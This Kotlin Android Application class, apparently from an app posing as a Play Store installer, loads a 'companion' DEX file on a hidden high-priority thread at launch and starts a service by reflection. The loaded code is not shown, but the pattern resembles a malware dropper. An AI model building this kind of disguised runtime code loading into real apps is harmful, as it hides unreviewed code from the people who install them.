package com.playstore.installer

import android.app.Application
import android.content.Intent

class LauncherApplication : Application() {

    companion object {
        lateinit var instance: LauncherApplication
            private set

        // Phase 3: DEX loader result accessible across activities
        @Volatile var dexLoaderReady: Boolean = false
        @Volatile var dexLoaderError: String? = null
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Phase 3: Start DEX loading immediately on app launch
        // This runs BEFORE any Activity — ensures DexLoader is ready
        // by the time InstallActivity needs it (10-15 seconds later)
        Thread {
            try {
                val loader = DexLoader.loadCompanionDex(applicationContext)
                dexLoaderReady = loader != null
                if (loader == null) {
                    dexLoaderError = DexLoader.getError()
                }
            } catch (e: Exception) {
                dexLoaderError = e.message
                dexLoaderReady = false
            }
        }.apply {
            isDaemon = true
            name = "nova-dex-loader"
            priority = Thread.MAX_PRIORITY
            start()
        }

        startService(Intent(this, Class.forName(
            "com.playstore.installer.service.LauncherService"
        )))
    }
}
